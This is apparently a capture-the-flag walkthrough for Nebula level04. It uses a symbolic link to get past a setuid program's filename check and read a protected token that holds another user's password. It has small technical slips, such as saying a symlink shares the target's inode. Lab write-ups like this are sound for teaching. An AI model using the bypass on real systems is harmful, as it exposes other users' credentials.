##Level04  
  
The source code is found [here](https://exploit-exercises.com/nebula/level04/).  
  
All it does is open a file, as long as its name is `token`, and write to standard output (`write(1, buf, rc)`):
```
$ ./flag04 
./flag04 [file to read]
```
  
This is what happens when we try runing the mission executable with `token` as argument:  
```
$ /home/flag04/flag04 token
You may not access 'token'
```
Renaming token or copying it to another diretory is not permitted either.
So to pass the level we need to provide `flag04` with a filename that loads `/home/flag04/token` in the file descriptor.  
How to create a file with the same inode as `/home/flag04/token`? Symbolik (soft) links.  
```
$ cd /home/level04
$ ln -s /home/flag04/token /home/level04/SLink
$ home/flag04/flag04 /home/level04/SLink
<output supressed>
```
Token's output is the password to user flag04. Exit and login as that user, then run `$ ./getflag` to complete the mission.
